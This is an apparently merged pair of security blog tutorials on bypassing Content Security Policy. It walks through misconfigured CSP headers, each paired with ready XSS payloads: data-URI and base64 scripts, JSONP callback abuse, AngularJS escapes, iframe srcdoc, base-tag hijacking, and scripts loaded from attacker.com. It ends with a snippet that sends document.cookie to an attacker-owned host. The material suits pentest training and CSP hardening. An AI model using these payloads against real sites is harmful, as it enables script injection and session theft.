
##
#
https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
#
https://www.cobalt.io/blog/csp-and-bypasses
#
##



Hello readers, this writeup is a contribution towards our cyber community from where I have gained every bit of my knowledge. I will try to cover all methods of CSP bypasses which I have learned to date.

What is a CSP ?

CSP stands for Content Security Policy which is a mechanism to define which resources can be fetched out or executed by a web page. In other words, it can be understood as a policy that decides which scripts, images, iframes can be called or executed on a particular page from different locations. Content Security Policy is implemented via response headers or meta elements of the HTML page. From there, it’s browser’s call to follow that policy and actively block violations as they are detected.

Why it is used?

Content Security Policy is widely used to secure web applications against content injection like cross-site scripting attacks. Also by using CSP the server can specify which protocols are allowed to be used. Can we think CSP as mitigation of XSS? The answer is no! CSP is an extra layer of security against content injection attacks. The first line of defense is output encoding and input validation always. A successful CSP implementation not only secures a web page against these vulnerabilities but also gives a wide range of attack details that were unsuccessful i.e. blocked by CSP itself. Web admin can be benefitted using this feature to spot a potential bug.

How does it work?

CSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline JavaScript, and the use of eval().

If you are a developer you will require to define all allowed origins for every type of resource your website utilizes. Suppose you are the owner of a website abc.com and these websites loads multiple resources like scripts, images, css from localhost, and different sources as well, say allowed.com. A very basic policy would be :

Implemented via Response Header:

Content-Security-policy: default-src 'self'; script-src 'self' allowed.com; img-src 'self' allowed.com; style-src 'self';
Implemented via meta tag:


Let's take an example of a CSP in a webpage https://www.bhaveshthakur.com and see how it works:

Content-Security-Policy: default-src 'self'; script-src https://bhaveshthakur.com; report-uri /Report-parsing-url;
<img src=image.jpg> This image will be allowed as image is loading from same domain i.e. bhaveshthakur.com
<script src=script.js> This script will be allowed as the script is loading from the same domain i.e. bhaveshthakur.com
<script src=https://evil.com/script.js> This script will not-allowed as the script is trying to load from undefined domain i.e. evil.com
"/><script>alert(1337)</script> This will not-allowed on the page. 
But why? Because inline-src is set to self. But Wait! where the hell it is mentioned? I can't see inline-src defined in above CSP at all.
The answer is have you noticed default-src 'self'? So even other directives are not defined but they will be following default-src directive value only. Below is the list of directives which will follow default-src value even though they are not defined in the policy:
child-src connect-src font-src frame-src img-src manifest-src
media-src object-src prefetch-src script-src script-src-elem
script-src-attr style-src style-src-elem style-src-attr worker-src
We have a fair understanding of content security policy directives and its resources. There is one more important thing we need to know. Whenever CSP restricts any invalid source to load data it can report about the incident to website administrators if below directive is defined in the policy:

Content-Security-Policy: default-src 'self'; img-src https://*; child-src 'none'; report-uri /Report-parsing-url;
Administrators can track which kind of attack scripts or techniques are used by attackers to load malicious content from untrusted resources. Now, let's move to the interesting part Bypassing Techniques:

Analyze the CSP policy properly. There are few online tools that are very helpful.

1. https://csp-evaluator.withgoogle.com/
2. https://cspvalidator.org/
Below is the screenshot of how they evaluate and provide you results.


Scenario : 1

Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
By observing this policy we can say it's damn vulnerable and will allow inline scripting as well . The reason behind that is the usage of unsafe-inline source as a value of script-src directive.

working payload : "/><script>alert(1337);</script>
Scenario : 2

Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
Again this is a misconfigured CSP policy due to usage of unsafe-eval.
```
working payload : 
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
Scenario : 3

Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
```
working payloads :
"/>'><script src=https://attacker.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
Scenario: 4

Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
Misconfigured CSP policy again! we can see object-src and default-src are missing here.
```
working payloads :
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
Scenario: 5

Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
we can see object-src is set to none but yes this CSP can be bypassed too to perform XSS. How ? If the application allows users to upload any type of file to the host. An attacker can upload any malicious script and call within any tag.

working payloads :
"/>'><script src="/user_upload/mypic.png.js"></script>
Scenario : 6

Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
In such scenarios where script-src is set to self and a particular domain which is whitelisted, it can be bypassed using jsonp. jsonp endpoints allow insecure callback methods which allow an attacker to perform xss.

working payload :
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
Scenario : 7

Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
In such scenarios where script-src is set to self and a javascript library domain which is whitelisted. It can be bypassed using any vulnerable version of javascript file from that library , which allows the attacker to perform xss.
```
working payloads :
```
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
 <div ng-app ng-csp>
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
 </div>
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
Scenario : 8

Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
If the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable class. For more details visit this awesome git repo.

working payloads :
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
Scenario : 9

Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;
In the above scenario, there are two whitelisted domains from where scripts can be loaded to the webpage. Now if one domain has any open redirect endpoint CSP can be bypassed easily. The reason behind that is an attacker can craft a payload using redirect domain targeting to other whitelisted domains having a jsonp endpoint. And in this scenario XSS will execute because while redirection browser only validated host, not the path parameters.

working payload :
">'><script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
Scenario : 10

Content-Security-Policy: 
default-src 'self' data: *; connect-src 'self'; script-src  'self' ;
report-uri /_csp; upgrade-insecure-requests
THE above CSP policy can be bypassed using iframes. The condition is that application should allow iframes from the whitelisted domain. Now using a special attribute srcdoc of iframe, XSS can be easily achieved.

working payloads :
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
* sometimes it can be achieved using defer& async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```


Values for CSP Directives 
*: Except for data: blob: filesystem schemes, any URL can be used.
none: No sources are allowed to be loaded in this case.
self: A source that defines that resources from the same domain are permitted to be loaded.
data: Load resources using the data scheme (e.g. Base64 encoded images)
unsafe-eval: This allows you to create code from strings using eval() and window.execScript. This source should not be included in any directives. That's why it's called unsafe.
unsafe-hashes: Use this to enable specific event handlers inline.
unsafe-inline: This allows using inline resources, such as inline elements, javascript: URLs, and inline event handlers. For security reasons, this is not recommended.
nonce: An inline script whitelist that uses a cryptographic nonce (number used once). A nonce value must be unique and generated each time the server transmits a policy.
sha256-<hash>: The script has to have a specific SHA256 hash to be whitelisted.
To validate the CSP of your application, check out CSP Evaluator by Google.

csp-bypass-example

Unsafe Policies
 
Wildcard(*)
CSP Header

Content-Security-Policy: script-src 'self' https://cobalt.io https: data *; 

In script-src, a wildcard is used, which results in a misconfigured CSP policy.

XSS payloads:

<script src="data:text/javascript,alert(document.domain)"></script>

<script src=https://cobalt.io/evil.js></script>

 

Unsafe eval()
CSP Header

Content-Security-Policy: script-src https://cobalt.io 'unsafe-eval' data: http://*;

This policy remains vulnerable due to unsafe-eval usage despite having the script source set to https://www.cobalt.io.

XSS payloads:

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

 

Unsafe inline
CSP Header

Content-Security-Policy: script-src ‘self’  'unsafe-inline' ;

Despite this policy requiring scripts from the Cobalt.io site, it is vulnerable because the directive uses unsafe-inline.

XSS payloads:

<script>alert(domain);</script>

<Svg OnLoad=alert(domain)>

Example:

Notice that a normal <tag eventhandler=js> will work if unsafe-inline is implemented.

Here we can see the above CSP header is implemented.

csp-header-example

Using the payload mentioned above, we can achieve XSS vulnerability.

payload-xss-vulnerability-example

JSONP Callback and Whitelisted the Third Party
In JSONP, the same-origin policy (SOP) is bypassed so you can request and retrieve data from a server without worrying about cross-domain issues.

JavaScript payloads can be injected into JSONP endpoints through GET parameters called "callbacks", and the endpoint will return them to you as JSON, bypassing SOP(same origin policy). For example, we can send our JavaScript payload via the JSONP endpoint. Below is an example:

https://accounts.google.com/o/oauth2/revoke?callback=alert(1)

javascript-payload-via-JSONP-endpoints

The script-src policy can cause problems if a header has one of these endpoints whitelisted. The JSONP endpoint would allow us to bypass the CSP policy by loading our malicious JavaScript.
There are a number of ready-to-use CSP bypass endpoints available in JSONBee.

CSP header

script-src https://www.google.com https://accounts.google.com;

The following payload would be loaded because accounts.google.com allows JavaScript files to be loaded. To load our malicious JavaScript, we are abusing the JSONP feature.

XSS payloads:

cobalt.io?vuln_param=https://accounts.google.com/o/oauth2/revoke?callback=alert(1)

 

Lack of object-src and default-src
CSP header

Content-Security-Policy: script-src 'self' ;

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

 

">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'><param name="AllowScriptAccess" value="always"></object>

 

Angular JS
The CSP policy can be bypassed if the AngularJS application loads any scripts from a whitelisted domain. To accomplish this, a callback function and vulnerable class must be called. In addition, a special $event object is defined for AngularJS events, which simply refers to the browser event object. Through this object, you can bypass the CSP.

CSP header

Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;

XSS payloads:

ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>

 

File Upload
You can bypass the CSP if you can upload a JS file. There is a high probability that the server validates the uploaded file and allows only the specified file types to be uploaded.

In addition, even if you upload JS code into a file with an extension accepted by the server (e.g. script.png if png extension is allowed), this won't suffice because some servers, like the apache server, determine the MIME type of the file based on its extension. Chrome browser, for example, rejects Javascript code running in an image.

CSP header

Content-Security-Policy: script-src 'self';  object-src 'none' ;

XSS payloads:

‘“><script src="/uploads/csp.js"></script>

 

Whitelisted Scheme
CSP header

Content-Security-Policy: script-src data: ;

XSS payloads:

<script%20src=data:text/javascript,alert(1337)></script>

Here we can notice the above CSP header is implemented.

csp-header-implementation-example

After submitting the above payload, we can achieve XSS, bypassing the CSP.

xss-bypassing-csp

base-uri Bypass
A dangling markup injection can be performed if the base-uri directive is absent in the defined CSP. You can abuse the base tag to obtain an XSS by making the page load a script from your server if the script has a relative path (like /js/app.js). An HTTPS URL should be used if the vulnerable page is loaded over HTTPS.

CSP header

Content-Security-Policy: script-src 'nonce-abcd1234';

XSS payloads:

<Base Href=//X55.is>

We can notice that a CSP header is implemented like we discussed above.

csp-header-implementation-example-2

After submitting the above payload, we get the xss,

xss-payload-example-2

Folder path bypass
When you use the %2f to encode '/' as part of your CSP policy and point it to a folder, it will still be considered part of the folder. That seems to be the case with almost all modern-day browsers.

When the server decodes it, it can be bypassed by using "%2f..%2f",  bypassing the folder restriction. For example, you can access http://example.com/company/, and executing http://example.com/company%2f..%2fattacker/file.js will bypass the restriction.

CSP header: 

Content-Security-Policy: script-src cobalt.io/safe-directory/

XSS payloads:

<script src="https://<abc>.com/safe-directory%2f..%2f/abc/unsafe-directory"></script> 

Bypassing CSP using IFRAME
Attackers can use Iframes to bypass the below CSP policy. An iframe from the whitelisted domain must be allowed by the application in order to perform the bypass. An XSS attack can be easily facilitated by using the srcdoc attribute of the iframe.

CSP header

Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ; 

XSS payloads:

<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>

<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>

CSP Injection Bypass
In this case, the input from the user is reflected back in the CSP header. Let's take the following URL as an example:

https://www.cobalt.io?param=payload.

This is what you should see if your input is reflected in the CSP header.

CSP header

script-src payload;

object-src 'none';

base-uri 'none';

script-src can therefore be set to whatever value we want. This value can be easily set to a domain we control, bypassing the CSP.

CSP Data Exfiltration
Even though there’s a strict CSP that prohibits you from interacting with external servers, there are still things you can do to exfiltrate the data regardless of how strict the CSP is.

Location 

In order to send the secret information to the attacker's server, you could simply update the location:

var sessionid = document.cookie.split('=')[1] + "."; 

document.location = "https://www.attacker-owned-website.com/?" + sessionid;

Conclusion
CSP serves as a defense-in-depth strategy against XSS and clickjacking attacks. CSP can, however, be easily bypassed if not implemented properly. Therefore, it is ideal for all scripts to reside on your hosts, and your CSP should not allow anything from the internet.

We hope you enjoyed this blog post. See you again in our next blog post.

Reference
https://brutelogic.com.br/blog/csp-bypass-guidelines/
https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
